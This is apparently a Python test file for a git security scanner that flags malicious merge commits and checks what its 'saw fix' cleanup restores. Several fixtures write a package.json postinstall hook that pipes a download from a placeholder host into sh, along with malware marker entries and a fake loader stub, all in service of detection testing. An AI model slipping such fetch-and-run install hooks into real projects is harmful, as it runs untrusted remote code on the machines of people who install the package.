#!/usr/bin/env python3
"""A merge commit that carries a known payload reads infected and names `saw fix amend`; a merge that
only needs checking by hand is shown at medium; what `saw fix` takes out stays as it was."""
from __future__ import annotations

import io
import random
import string
import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path
from unittest import mock

from stayawake.bots.security.models import CONFIRMED, HEURISTIC, Severity
from stayawake.bots.security.pr import fix as fixmod
from stayawake.bots.security.remediation import delivery, live
from stayawake.bots.security.scanner import scan_target
from stayawake.bots.security.signatures import load_signatures
from stayawake.bots.security.targets import LocalRepoTarget
from stayawake.bots.security.targets.base import ScanOptions
from tests.support.gitrepo import GitSandbox

MARKERS = "temp_auto_push.bat\nbranch_structure.json\n"
LOADER = "var _$_ab12 = 1;\n"


class _Merges(GitSandbox):
    def merged(self, into: str, text: str, *, conflict: bool, name: str = "project") -> Path:
        """A repository whose merge commit writes `text` into `into`, a file the merge resolved when
        `conflict`, or one neither side changed otherwise."""
        repo = self.new_repo(name)
        self.write(repo, ".gitignore", "node_modules/\n")
        self.write(repo, "README.md", "# project\n")
        self.write(repo, "app.js", "var ok = 1;\n")
        self.write(repo, "a.txt", "a\n")
        self.write(repo, "b.txt", "b\n")
        self.commit(repo, "start")
        self.git(repo, "checkout", "-q", "-b", "side")
        self.write(repo, "b.txt", "b2\n")
        if conflict:
            self.write(repo, into, "from side\n")
        self.commit(repo, "side")
        self.git(repo, "checkout", "-q", "main")
        self.write(repo, "a.txt", "a2\n")
        if conflict:
            self.write(repo, into, "from main\n")
        self.commit(repo, "main")
        self.git_may_fail(repo, "merge", "-q", "--no-commit", "--no-ff", "side")
        self.write(repo, into, text)
        self.git(repo, "add", "-A")
        self.git(repo, "commit", "-qm", "Merge branch side")
        return repo

    @staticmethod
    def merge_findings(repo: Path):
        result = scan_target(LocalRepoTarget(repo, "p", ScanOptions()), load_signatures(), [])
        return [f for f in result.findings if f.vector == "evil-merge"]


class TestAMergeThatCarriesAKnownPayload(_Merges):
    def test_it_reads_infected_when_the_merge_resolved_that_file(self):
        repo = self.merged(".gitignore", "node_modules/\n" + MARKERS, conflict=True)
        [finding] = self.merge_findings(repo)
        self.assertEqual(finding.confidence, CONFIRMED)
        self.assertEqual(finding.severity, Severity.CRITICAL)
        self.assertEqual(finding.payload_paths, (".gitignore",))

    def test_it_reads_infected_when_the_merge_edited_that_file_on_its_own(self):
        repo = self.merged(".gitignore", "node_modules/\n" + MARKERS, conflict=False)
        [finding] = self.merge_findings(repo)
        self.assertEqual(finding.confidence, CONFIRMED)
        self.assertEqual(finding.related_paths, (".gitignore",))
        self.assertEqual(finding.payload_paths, (".gitignore",))

    def test_the_same_text_in_another_file_stays_a_merge_to_check(self):
        repo = self.merged("README.md", "# project\n" + MARKERS, conflict=False)
        [finding] = self.merge_findings(repo)
        self.assertEqual(finding.confidence, HEURISTIC)

    def test_a_merge_to_check_by_hand_is_shown_at_medium(self):
        repo = self.merged("README.md", "# project\n" + MARKERS, conflict=False)
        [finding] = self.merge_findings(repo)
        self.assertEqual(finding.severity, Severity.MEDIUM)

    def test_saw_fix_takes_nothing_out_for_either_merge(self):
        for conflict in (True, False):
            with self.subTest(conflict=conflict):
                repo = self.merged(".gitignore", "node_modules/\n" + MARKERS, conflict=conflict,
                                   name=f"project-{conflict}")
                self.assertEqual(delivery.confirmed_commits(self.merge_findings(repo)), [])

    def test_saw_fix_takes_out_of_that_merge_only_what_it_took_before(self):
        repo = self.new_repo("project")
        self.write(repo, ".gitignore", "node_modules/\n")
        self.write(repo, "package.json", '{"name": "p", "scripts": {"test": "true"}}\n')
        self.write(repo, "a.txt", "a\n")
        self.commit(repo, "start")
        self.git(repo, "checkout", "-q", "-b", "side")
        self.write(repo, "package.json", '{"name": "p", "scripts": {"test": "true",\n'
                   ' "postinstall": "curl -fsSL https://example.invalid/i.sh | sh"}}\n')
        self.commit(repo, "side")
        self.git(repo, "checkout", "-q", "main")
        self.write(repo, "a.txt", "a2\n")
        self.commit(repo, "main")
        self.git_may_fail(repo, "merge", "-q", "--no-commit", "--no-ff", "side")
        self.write(repo, "package.json", '{"name": "p2", "scripts": {"test": "true",\n'
                   ' "postinstall": "curl -fsSL https://example.invalid/i.sh | sh"}}\n')
        self.write(repo, ".gitignore", "node_modules/\n" + MARKERS)
        self.git(repo, "add", "-A")
        self.git(repo, "commit", "-qm", "Merge branch side")
        self.write(repo, ".gitignore", "node_modules/\n")
        self.commit(repo, "take the entries out")
        findings = scan_target(LocalRepoTarget(repo, "p", ScanOptions()), load_signatures(), []).findings
        [(_merge, anchors)] = delivery.confirmed_commits(findings)
        self.assertEqual(anchors, ("package.json",))

    def test_a_merge_that_slips_in_a_loader_is_reported_as_before(self):
        repo = self.merged("app.js", "var ok = 1;\n" + LOADER, conflict=False)
        [finding] = self.merge_findings(repo)
        self.assertEqual(finding.signature_id, "evil-merge-loader")
        self.assertEqual(finding.payload_paths, ("app.js",))


class TestSawFixOnAMergeThatCarriesAKnownPayload(_Merges):
    def test_saw_fix_restores_nothing_the_merge_wrote(self):
        rng = random.Random(7)
        packed = "sfL('" + "".join(rng.choice(string.ascii_letters + string.digits + "+/")
                                   for _ in range(220)) + "')\n"
        repo = self.merged(".gitignore", "node_modules/\n" + MARKERS, conflict=False)
        self.git(repo, "reset", "-q", "--hard", "HEAD~1")
        self.git_may_fail(repo, "merge", "-q", "--no-commit", "--no-ff", "side")
        self.write(repo, ".gitignore", "node_modules/\n" + MARKERS)
        self.write(repo, "app.js", "var ok = 1;\n" + packed)
        self.git(repo, "add", "-A")
        self.git(repo, "commit", "-qm", "Merge branch side")
        self.write(repo, ".gitignore", "node_modules/\n")
        self.commit(repo, "take the entries out")
        before = self.git(repo, "show", "main:app.js")
        with redirect_stdout(io.StringIO()), redirect_stderr(io.StringIO()):
            fixmod.prepare_fix(repo, ScanOptions(), load_signatures(), [])
        branches = self.git(repo, "for-each-ref", "--format=%(refname:short)", "refs/heads/").split()
        made_by_the_fix = [b for b in branches if b not in ("main", "side")]
        self.assertTrue(made_by_the_fix, "the fix must have prepared a branch for this to mean anything")
        for branch in made_by_the_fix:
            with self.subTest(branch=branch):
                self.assertEqual(self.git(repo, "show", f"{branch}:app.js"), before)


class TestWhatTheMergeDidNotWriteIsNotItsPayload(_Merges):
    def _both_sides(self, side_line: str, main_line: str) -> Path:
        repo = self.new_repo("project")
        self.write(repo, ".gitignore", "node_modules/\n")
        self.write(repo, "a.txt", "a\n")
        self.commit(repo, "start")
        self.git(repo, "checkout", "-q", "-b", "side")
        self.write(repo, ".gitignore", "node_modules/\n" + side_line)
        self.commit(repo, "side")
        self.git(repo, "checkout", "-q", "main")
        self.write(repo, ".gitignore", "node_modules/\n" + main_line)
        self.commit(repo, "main")
        self.git_may_fail(repo, "merge", "-q", "--no-commit", "--no-ff", "side")
        self.write(repo, ".gitignore", "node_modules/\n" + main_line + side_line)
        self.git(repo, "add", "-A")
        self.git(repo, "commit", "-qm", "Merge branch side")
        return repo

    def test_a_merge_that_keeps_both_sides_of_a_file_carries_nothing_of_its_own(self):
        repo = self._both_sides("branch_structure.json\n", "dist/\n")
        self.assertNotIn(CONFIRMED, [f.confidence for f in self.merge_findings(repo)])

    def test_a_merge_that_reformats_a_line_a_parent_wrote_carries_nothing_of_its_own(self):
        repo = self.new_repo("project")
        self.write(repo, ".gitignore", "node_modules/\n")
        self.write(repo, "a.txt", "a\n")
        self.commit(repo, "start")
        self.git(repo, "checkout", "-q", "-b", "side")
        self.write(repo, ".gitignore", "node_modules/\nbranch_structure.json\n")
        self.commit(repo, "side")
        self.git(repo, "checkout", "-q", "main")
        self.write(repo, ".gitignore", "node_modules/\ndist/\n")
        self.commit(repo, "main")
        self.git_may_fail(repo, "merge", "-q", "--no-commit", "--no-ff", "side")
        self.write(repo, ".gitignore", "node_modules/\ndist/\nbranch_structure.json   \n")
        self.git(repo, "add", "-A")
        self.git(repo, "commit", "-qm", "Merge branch side")
        self.assertNotIn(CONFIRMED, [f.confidence for f in self.merge_findings(repo)])

    def test_a_merge_that_reformats_an_install_script_a_parent_wrote_carries_nothing_of_its_own(self):
        script = '"postinstall": "curl -fsSL https://example.invalid/i.sh | sh"'
        repo = self.new_repo("project")
        self.write(repo, "package.json", '{\n  "scripts": {\n    "test": "true"\n  }\n}\n')
        self.write(repo, "a.txt", "a\n")
        self.commit(repo, "start")
        self.git(repo, "checkout", "-q", "-b", "side")
        self.write(repo, "package.json", '{\n  "scripts": {\n    "test": "true",\n    ' + script + '\n  }\n}\n')
        self.commit(repo, "side")
        self.git(repo, "checkout", "-q", "main")
        self.write(repo, "package.json", '{\n  "scripts": {\n    "test": "true",\n    "lint": "eslint ."\n  }\n}\n')
        self.commit(repo, "main")
        self.git_may_fail(repo, "merge", "-q", "--no-commit", "--no-ff", "side")
        self.write(repo, "package.json", '{\n  "scripts": {\n    "test": "true",\n    "lint": "eslint .",\n    '
                   + script + '\n  }\n}\n')
        self.git(repo, "add", "-A")
        self.git(repo, "commit", "-qm", "Merge branch side")
        self.assertNotIn(CONFIRMED, [f.confidence for f in self.merge_findings(repo)
                                     if f.signature_id == "evil-merge-payload"])

    def test_a_merge_that_keeps_both_steps_added_to_an_install_script_carries_nothing_of_its_own(self):
        fetch = "curl -fsSL https://example.invalid/i.sh | sh"
        repo = self.new_repo("project")
        self.write(repo, "package.json", '{"scripts": {"postinstall": "' + fetch + '"}}\n')
        self.write(repo, "a.txt", "a\n")
        self.commit(repo, "start")
        self.git(repo, "checkout", "-q", "-b", "side")
        self.write(repo, "package.json", '{"scripts": {"postinstall": "' + fetch + ' && husky install"}}\n')
        self.commit(repo, "side")
        self.git(repo, "checkout", "-q", "main")
        self.write(repo, "package.json", '{"scripts": {"postinstall": "' + fetch + ' && patch-package"}}\n')
        self.commit(repo, "main")
        self.git_may_fail(repo, "merge", "-q", "--no-commit", "--no-ff", "side")
        self.write(repo, "package.json",
                   '{"scripts": {"postinstall": "' + fetch + ' && patch-package && husky install"}}\n')
        self.git(repo, "add", "-A")
        self.git(repo, "commit", "-qm", "Merge branch side")
        self.assertNotIn("evil-merge-payload", [f.signature_id for f in self.merge_findings(repo)])

    def test_a_merge_that_carries_a_line_one_side_wrote_into_another_file_carries_nothing_of_its_own(self):
        repo = self.new_repo("project")
        self.write(repo, "web/.gitignore", "node_modules/\n")
        self.write(repo, "a.txt", "a\n")
        self.commit(repo, "start")
        self.git(repo, "checkout", "-q", "-b", "side")
        self.write(repo, "web/.gitignore", "node_modules/\nbranch_structure.json\n")
        self.commit(repo, "side")
        self.git(repo, "checkout", "-q", "main")
        self.git(repo, "rm", "-q", "web/.gitignore")
        self.write(repo, "app/.gitignore", "# moved out of web/\nnode_modules/\ncoverage/\n.cache/\n")
        self.commit(repo, "main")
        self.git_may_fail(repo, "merge", "-q", "--no-commit", "--no-ff", "side")
        self.git_may_fail(repo, "rm", "-q", "--cached", "web/.gitignore")
        (repo / "web" / ".gitignore").unlink(missing_ok=True)
        self.write(repo, "app/.gitignore", "# moved out of web/\nnode_modules/\ncoverage/\n.cache/\n"
                                           "branch_structure.json\n")
        self.git(repo, "add", "-A")
        self.git(repo, "commit", "-qm", "Merge branch side")
        self.assertNotIn("evil-merge-payload", [f.signature_id for f in self.merge_findings(repo)])

    def test_a_merge_into_a_build_output_folder_is_graded_as_before(self):
        repo = self.merged("dist/.gitignore", MARKERS, conflict=False)
        self.assertIn("dist/.gitignore", self.git(repo, "show", "--name-only", "--format=", "HEAD"))
        self.assertNotIn("evil-merge-payload", [f.signature_id for f in self.merge_findings(repo)])

    def _kept_from_before_both_sides(self, name: str, before: str, merged: str) -> Path:
        repo = self.new_repo("project")
        self.write(repo, name, before)
        self.write(repo, "a.txt", "a\n")
        self.write(repo, "b.txt", "b\n")
        self.commit(repo, "start")
        self.git(repo, "checkout", "-q", "-b", "side")
        self.write(repo, "b.txt", "b2\n")
        self.commit(repo, "side")
        self.git(repo, "checkout", "-q", "main")
        self.write(repo, "a.txt", "a2\n")
        self.commit(repo, "main")
        self.git_may_fail(repo, "merge", "-q", "--no-commit", "--no-ff", "side")
        self.write(repo, name, merged)
        self.git(repo, "add", "-A")
        self.git(repo, "commit", "-qm", "Merge branch side")
        return repo

    def test_a_merge_that_keeps_a_line_both_parents_already_had_carries_nothing_of_its_own(self):
        repo = self._kept_from_before_both_sides(".gitignore", "node_modules/\nbranch_structure.json\n",
                                                 "node_modules/\ndist/\nbranch_structure.json\n")
        self.assertNotIn("evil-merge-payload", [f.signature_id for f in self.merge_findings(repo)])

    def test_a_merge_that_keeps_an_install_script_both_parents_already_ran_carries_nothing_of_its_own(self):
        fetch = '"postinstall": "curl -fsSL https://example.invalid/i.sh | sh"'
        repo = self._kept_from_before_both_sides("package.json", '{"scripts": {' + fetch + '}}\n',
                                                 '{"name": "p", "scripts": {' + fetch + '}}\n')
        self.assertNotIn("evil-merge-payload", [f.signature_id for f in self.merge_findings(repo)])

    def _sides(self, start: dict, side: dict, main: dict, merged: dict, *, keep_ours=()) -> Path:
        repo = self.new_repo("project")
        for rel, text in {**start, "a.txt": "a\n"}.items():
            self.write(repo, rel, text)
        self.commit(repo, "start")
        self.git(repo, "checkout", "-q", "-b", "side")
        for rel, text in side.items():
            (repo / rel).unlink() if text is None else self.write(repo, rel, text)
        self.commit(repo, "side")
        self.git(repo, "checkout", "-q", "main")
        for rel, text in {**main, "a.txt": "a2\n"}.items():
            (repo / rel).unlink() if text is None else self.write(repo, rel, text)
        self.commit(repo, "main")
        self.git_may_fail(repo, "merge", "-q", "--no-commit", "--no-ff", "side")
        for rel in keep_ours:
            self.git(repo, "checkout", "HEAD", "--", rel)
        for rel, text in merged.items():
            if text is None:
                self.git_may_fail(repo, "rm", "-q", "--cached", rel)
                (repo / rel).unlink(missing_ok=True)
            else:
                self.write(repo, rel, text)
        self.git(repo, "add", "-A")
        self.git(repo, "commit", "-qm", "Merge branch side")
        return repo

    def test_a_merge_that_resolves_a_version_around_a_quoted_install_script_carries_nothing_of_its_own(self):
        script = '"postinstall": "curl -fsSL \\"https://example.invalid/i?os=all&v=2\\" | sh"'
        manifest = '{\n  "version": "%s",\n  "scripts": {\n    ' + script + '\n  }\n}\n'
        repo = self._sides({"package.json": manifest % "1.0.0"}, {"package.json": manifest % "1.0.1"},
                           {"package.json": manifest % "1.1.0"}, {"package.json": manifest % "1.1.1"})
        self.assertNotIn("evil-merge-payload", [f.signature_id for f in self.merge_findings(repo)])

    def test_a_merge_that_keeps_its_own_unchanged_copy_of_a_file_carries_nothing_of_its_own(self):
        repo = self._sides({".gitignore": "node_modules/\n" + MARKERS}, {".gitignore": "node_modules/\n"},
                           {"b.txt": "b\n"}, {}, keep_ours=(".gitignore",))
        self.assertNotIn("evil-merge-payload", [f.signature_id for f in self.merge_findings(repo)])

    def test_a_merge_that_carries_a_line_one_side_wrote_in_other_letters_carries_nothing_of_its_own(self):
        repo = self._sides({"web/.gitignore": "node_modules/\n"}, {"web/.gitignore": "node_modules/\nBRANCH_STRUCTURE.JSON\n"},
                           {"web/.gitignore": None, "app/.gitignore": "# moved out of web/\nnode_modules/\ncoverage/\n"},
                           {"web/.gitignore": None,
                            "app/.gitignore": "# moved out of web/\nnode_modules/\ncoverage/\nbranch_structure.json\n"})
        self.assertNotIn("evil-merge-payload", [f.signature_id for f in self.merge_findings(repo)])

    def test_a_merge_that_carries_an_install_script_one_side_wrote_in_other_spacing_carries_nothing_of_its_own(self):
        repo = self._sides({"web/package.json": '{"scripts": {"test": "true"}}\n'},
                           {"web/package.json": '{"scripts": {"test": "true", '
                                                '"postinstall": "curl -fsSL https://example.invalid/i.sh | sh"}}\n'},
                           {"web/package.json": None, "app/package.json": '{"name": "app", "scripts": {"lint": "x"}}\n'},
                           {"web/package.json": None,
                            "app/package.json": '{"name": "app", "scripts": {"lint": "x", '
                                                '"postinstall": "curl  -fsSL  https://example.invalid/i.sh  |  sh"}}\n'})
        self.assertNotIn("evil-merge-payload", [f.signature_id for f in self.merge_findings(repo)])

    def test_a_merge_of_three_branches_carries_nothing_a_branch_wrote(self):
        repo = self.new_repo("project")
        self.write(repo, ".gitignore", "node_modules/\n")
        self.write(repo, "a.txt", "a\n")
        self.commit(repo, "start")
        for branch, rel, text in (("one", ".gitignore", "node_modules/\n" + MARKERS), ("two", "b.txt", "b\n")):
            self.git(repo, "checkout", "-q", "-b", branch, "main")
            self.write(repo, rel, text)
            self.commit(repo, branch)
        self.git(repo, "checkout", "-q", "main")
        self.write(repo, "a.txt", "a2\n")
        self.commit(repo, "main")
        self.git(repo, "merge", "-q", "--no-edit", "one", "two")
        self.assertNotIn(CONFIRMED, [f.confidence for f in self.merge_findings(repo)])

    def test_a_manifest_that_cannot_be_read_keeps_the_merge_reported_and_says_it_is_not_known_to_be_clean(self):
        deep = "[" * 200_000 + "]" * 200_000
        repo = self.merged("pkg/package.json", deep, conflict=False)
        self.git(repo, "rm", "-q", "pkg/package.json")
        self.commit(repo, "take the manifest out")
        result = scan_target(LocalRepoTarget(repo, "p", ScanOptions()), load_signatures(), [])
        self.assertTrue([f for f in result.findings if f.vector == "evil-merge"])
        self.assertIsNone(result.error)
        self.assertTrue([n for n in result.notes if "pkg/package.json" in n and "not known to be clean" in n])

    def test_a_file_that_cannot_be_read_does_not_hide_a_payload_beside_it(self):
        deep = "[" * 200_000 + "]" * 200_000
        repo = self.merged(".gitignore", "node_modules/\n" + MARKERS, conflict=False)
        self.git(repo, "reset", "-q", "--hard", "HEAD~1")
        self.git_may_fail(repo, "merge", "-q", "--no-commit", "--no-ff", "side")
        self.write(repo, ".gitignore", "node_modules/\n" + MARKERS)
        self.write(repo, "pkg/package.json", deep)
        self.git(repo, "add", "-A")
        self.git(repo, "commit", "-qm", "Merge branch side")
        self.git(repo, "rm", "-q", "pkg/package.json")
        self.commit(repo, "take the manifest out")
        result = scan_target(LocalRepoTarget(repo, "p", ScanOptions()), load_signatures(), [])
        [finding] = [f for f in result.findings if f.vector == "evil-merge"]
        self.assertEqual(finding.signature_id, "evil-merge-payload")
        unchecked = [n for n in result.notes if "not known to be clean" in n]
        self.assertTrue(unchecked)
        self.assertTrue(all("pkg/package.json" in n and ".gitignore" not in n for n in unchecked))

    def test_a_merge_whose_only_change_is_a_broken_manifest_still_needs_checking(self):
        deep = "[" * 200_000 + "]" * 200_000
        repo = self.merged("package.json", deep, conflict=True)
        self.write(repo, "package.json", '{"name": "p"}\n')
        self.commit(repo, "a readable manifest")
        result = scan_target(LocalRepoTarget(repo, "p", ScanOptions()), load_signatures(), [])
        self.assertTrue(result.suspicious or result.infected, [(f.signature_id, f.path) for f in result.findings])
        self.assertTrue([f for f in result.findings if f.vector == "evil-merge"])

    def test_a_merge_whose_parents_changed_more_than_saw_reads_keeps_its_grade_and_says_so(self):
        from stayawake.lib.git.merge import corroborate
        repo = self.merged("lib/new.js", LOADER, conflict=False)
        with mock.patch.object(corroborate, "_PARENT_FILES_MAX", 1):
            result = scan_target(LocalRepoTarget(repo, "p", ScanOptions()), load_signatures(), [])
        [finding] = [f for f in result.findings if f.vector == "evil-merge"]
        self.assertEqual(finding.signature_id, "evil-merge")
        self.assertTrue([n for n in result.notes if "lib/new.js" in n and "not known to be clean" in n])

    def test_a_merge_that_slips_the_markers_in_past_a_padded_side_still_reads_infected(self):
        from stayawake.lib.git.merge import corroborate
        repo = self.merged(".gitignore", "node_modules/\n" + MARKERS, conflict=True)
        self.git(repo, "checkout", "-q", "side")
        for i in range(6):
            self.write(repo, f"pad/{i}.txt", f"{i}\n")
        self.commit(repo, "pad the side")
        self.git(repo, "checkout", "-q", "main")
        self.git(repo, "reset", "-q", "--hard", "HEAD~1")
        self.git_may_fail(repo, "merge", "-q", "--no-commit", "--no-ff", "side")
        self.write(repo, ".gitignore", "node_modules/\n" + MARKERS)
        self.git(repo, "add", "-A")
        self.git(repo, "commit", "-qm", "Merge branch side")
        with mock.patch.object(corroborate, "_PARENT_FILES_MAX", 5):
            [finding] = self.merge_findings(repo)
        self.assertEqual(finding.signature_id, "evil-merge-payload")

    def test_a_known_payload_the_scan_cannot_rule_out_still_needs_checking(self):
        from stayawake.lib.git.merge import corroborate
        repo = self.merged(".gitignore", "node_modules/\n" + MARKERS, conflict=True)
        with mock.patch.object(corroborate, "_SCAN_BYTES_MAX", 1):
            result = scan_target(LocalRepoTarget(repo, "p", ScanOptions()), load_signatures(), [])
        self.assertTrue(result.suspicious or result.infected)
        self.assertTrue([f for f in result.findings if f.vector == "evil-merge"])

    def test_a_merge_that_creates_a_file_with_the_markers_reads_infected_however_much_the_scan_has_read(self):
        from stayawake.lib.git.merge import corroborate
        repo = self.merged("tools/.gitignore", MARKERS, conflict=False)
        with mock.patch.object(corroborate, "_SCAN_BYTES_MAX", 1):
            [finding] = self.merge_findings(repo)
        self.assertEqual(finding.signature_id, "evil-merge-payload")

    def test_a_large_merge_with_no_known_payload_reads_as_before(self):
        from stayawake.lib.git.merge import corroborate
        names = [f"src/{i}.txt" for i in range(8)]
        repo = self._sides({name: "start\n" for name in names}, {name: "side\n" for name in names},
                           {name: "main\n" for name in names}, {name: "both\n" for name in names})
        with mock.patch.object(corroborate, "_SCAN_BYTES_MAX", 1), \
                mock.patch.object(corroborate, "_PARENT_FILES_MAX", 1):
            result = scan_target(LocalRepoTarget(repo, "p", ScanOptions()), load_signatures(), [])
        self.assertEqual([f for f in result.findings if f.vector == "evil-merge"], [])
        self.assertFalse([n for n in result.notes if "not known to be clean" in n])

    def test_an_earlier_version_that_cannot_be_read_is_tried_once_per_merge(self):
        from stayawake.lib.git.merge import corroborate
        repo = self.new_repo("project")
        for rel in ("a/.gitignore", "b/.gitignore", "c/.gitignore"):
            self.write(repo, rel, "node_modules/\n")
        self.write(repo, "x.txt", "x\n")
        self.commit(repo, "start")
        self.git(repo, "checkout", "-q", "-b", "side")
        self.write(repo, "y.txt", "y\n")
        self.commit(repo, "side")
        self.git(repo, "checkout", "-q", "main")
        self.write(repo, "x.txt", "x2\n")
        self.commit(repo, "main")
        self.git_may_fail(repo, "merge", "-q", "--no-commit", "--no-ff", "side")
        for rel in ("a/.gitignore", "b/.gitignore", "c/.gitignore"):
            self.write(repo, rel, "node_modules/\n" + MARKERS)
        self.git(repo, "add", "-A")
        self.git(repo, "commit", "-qm", "Merge branch side")
        calls = []

        def unreadable(*args, **kwargs):
            calls.append(args)
            raise corroborate.Unread("x")
        with mock.patch.object(corroborate, "_read_versions", unreadable):
            self.merge_findings(repo)
        self.assertEqual(len(calls), 1)

    def test_a_submodule_a_merge_brings_in_is_not_an_unreadable_file(self):
        repo = self.new_repo("project")
        self.write(repo, "a.txt", "a\n")
        start = self.commit(repo, "start")
        self.git(repo, "checkout", "-q", "-b", "side")
        self.write(repo, "b.txt", "b\n")
        self.commit(repo, "side")
        self.git(repo, "checkout", "-q", "main")
        self.write(repo, "a.txt", "a2\n")
        self.commit(repo, "main")
        self.git_may_fail(repo, "merge", "-q", "--no-commit", "--no-ff", "side")
        self.git(repo, "update-index", "--add", "--cacheinfo", f"160000,{start},vendor/sub")
        self.git(repo, "commit", "-qm", "Merge branch side")
        result = scan_target(LocalRepoTarget(repo, "p", ScanOptions()), load_signatures(), [])
        self.assertIsNone(result.error)
        self.assertFalse([n for n in result.notes if "vendor/sub" in n])


class TestACleanedRepositoryWithThatMergeInItsHistory(_Merges):
    def setUp(self):
        super().setUp()
        self.repo = self.merged(".gitignore", "node_modules/\n" + MARKERS, conflict=True)
        self.write(self.repo, ".gitignore", "node_modules/\n")
        self.write(self.repo, "package-lock.json", "{\"lockfileVersion\": 3, \"packages\": {}}\n")
        self.commit(self.repo, "take the entries out")
        (self.repo / "node_modules" / "left-pad").mkdir(parents=True)
        (self.repo / "node_modules" / "left-pad" / "index.js").write_text("module.exports = 1;\n")

    def _report(self) -> str:
        from stayawake.bots.security import service
        config = Path(tempfile.mkdtemp()) / "c.yml"
        config.write_text("allowlist: []\n", encoding="utf-8")
        out = io.StringIO()
        with redirect_stdout(out), redirect_stderr(io.StringIO()):
            service.scan(str(config), paths=[str(self.repo)], no_stream=True)
        return " ".join(out.getvalue().split())

    def test_the_scan_reads_infected_and_names_saw_fix_amend(self):
        report = self._report()
        self.assertIn("INFECTED", report)
        self.assertIn("Run `saw fix amend`", report)

    def test_saw_fix_keeps_its_installed_packages_and_lockfile(self):
        def scan(*_args, **_kwargs):
            return scan_target(LocalRepoTarget(self.repo, "p", ScanOptions()), load_signatures(), [])
        live.clean_checkout(self.repo, ScanOptions(), load_signatures(), [], scan=scan)
        self.assertTrue((self.repo / "node_modules" / "left-pad" / "index.js").is_file())
        self.assertTrue((self.repo / "package-lock.json").is_file())



if __name__ == "__main__":
    unittest.main()
